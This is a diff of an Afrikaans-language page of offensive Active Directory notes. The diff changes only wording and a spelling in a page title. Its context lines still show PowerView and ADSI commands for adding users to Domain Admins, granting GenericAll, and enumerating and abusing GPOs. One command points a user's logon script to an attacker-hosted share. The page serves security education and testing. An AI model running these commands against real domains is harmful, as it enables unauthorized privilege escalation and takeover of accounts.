@@ -4,10 +4,10 @@
 
 **Hierdie bladsy is meestal 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**
 
-## BadSuccesor
+## BadSuccessor
 
 {{#ref}}
-BadSuccesor.md
+BadSuccessor.md
 {{#endref}}
 
 ## **GenericAll Regte op Gebruiker**
@@ -27,7 +27,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **GenericAll Regte op Groep**
 
-Hierdie voorreg laat 'n aanvaller toe om groep lidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat die aanvaller die groep se onderskeidende naam met `Get-NetGroup` geïdentifiseer het, kan hulle:
+Hierdie voorreg laat 'n aanvaller toe om groep lidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat die aanvaller die groep se onderskeibare naam met `Get-NetGroup` geïdentifiseer het, kan hulle:
 
 - **Hulself by die Domain Admins Groep Voeg**: Dit kan gedoen word deur direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
 ```bash
@@ -52,7 +52,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **Self (Self-Membership) op Groep**
 
-Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende opdragte volgorde te gebruik, kan self-voeging gedoen word:
+Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende opdragreeks te gebruik, kan self-toevoeging gedoen word:
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -86,13 +86,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite op Gebruiker**
 
-Hierdie toestemming laat 'n aanvaller toe om gebruikers eienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldskrip pad van 'n gebruiker verander om 'n kwaadwillige skrip uit te voer tydens gebruikers aanmelding. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken gebruiker op te dateer om na die aanvaller se skrip te verwys.
+Hierdie toestemming laat 'n aanvaller toe om gebruikers eienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldskrip pad van 'n gebruiker verander om 'n kwaadwillige skrip uit te voer tydens die gebruiker se aanmelding. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken gebruiker op te dateer om na die aanvaller se skrip te verwys.
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 ## **GenericWrite op Groep**
 
-Met hierdie voorreg kan aanvallers groeplidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrief objek, dit gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskap veranderinge met PowerShell-opdragte te verifieer.
+Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrief objek, dit gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskap veranderinge met PowerShell-opdragte te verifieer.
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -102,7 +102,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Die besit van 'n AD objek en die hê van `WriteDACL` voorregte daarop stel 'n aanvaller in staat om vir hulself `GenericAll` voorregte oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan bestaan daar beperkings wanneer daar probeer word om hierdie voorregte te benut met die Active Directory module se `Set-Acl` / `Get-Acl` cmdlets.
+Om 'n AD-objek te besit en `WriteDACL` voorregte daarop te hê, stel 'n aanvaller in staat om vir hulself `GenericAll` voorregte oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan bestaan daar beperkings wanneer daar probeer word om hierdie voorregte te benut met die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -124,7 +124,7 @@ Gedelegeerde toegang om Groep Beleidsobjekte (GPO's) te bestuur kan beduidende s
 
 Om verkeerd geconfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit stel die ontdekking van GPO's wat 'n spesifieke gebruiker die regte het om te bestuur, moontlik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om vas te stel watter rekenaars 'n spesifieke GPO van toepassing is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO toegepas het, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Beleide Toegepas op 'n Gegewe Rekenaar**: Om te sien watter beleide op 'n spesifieke rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.
 
@@ -157,15 +157,15 @@ GPO-opdaterings gebeur tipies elke 90 minute. Om hierdie proses te versnel, vera
 
 ### Under the Hood
 
-By die inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur middel van skripte of opdraglyn gereedskap wat daarop gemik is om stelsels gedrag te verander of bevoegdhede te verhoog.
+By inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur middel van skripte of opdraglyn gereedskap wat daarop gemik is om stelsels gedrag te verander of bevoegdhede te verhoog.
 
 Die struktuur van die taak, soos getoon in die XML-konfigurasie lêer wat deur `New-GPOImmediateTask` gegenereer is, skets die spesifieke van die geskeduleerde taak - insluitend die opdrag wat uitgevoer moet word en sy triggers. Hierdie lêer verteenwoordig hoe geskeduleerde take gedefinieer en bestuur word binne GPO's, wat 'n metode bied om arbitrêre opdragte of skripte as deel van beleidsafdwinging uit te voer.
 
 ### Users and Groups
 
-GPO's laat ook die manipulasie van gebruikers- en groep lidmaatskappe op teikenstelsels toe. Deur die Gebruikers en Groepe beleidslêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO-bestuursregte, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.
+GPO's laat ook die manipulasie van gebruikers- en groep lidmaatskappe op teikenstelsels toe. Deur die Gebruikers- en Groep beleid lêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO-bestuursregte, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.
 
-Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings aan hierdie lêer toe te voeg, kan spesifieke gebruikers verhoogde bevoegdhede oor geraakte stelsels verleen word. Hierdie metode bied 'n direkte benadering tot bevoegdheidverhoging deur GPO-manipulasie.
+Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings aan hierdie lêer toe te voeg, kan spesifieke gebruikers verhoogde bevoegdhede oor die geraakte stelsels verleen word. Hierdie metode bied 'n direkte benadering tot bevoegdheidverhoging deur GPO-manipulasie.
 
 Verder kan addisionele metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmeld/afmeld skripte, die wysiging van registriesleutels vir autoruns, die installering van sagteware via .msi lêers, of die redigering van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie paaie om toegang te handhaaf en teikenstelsels te beheer deur die misbruik van GPO's.
 
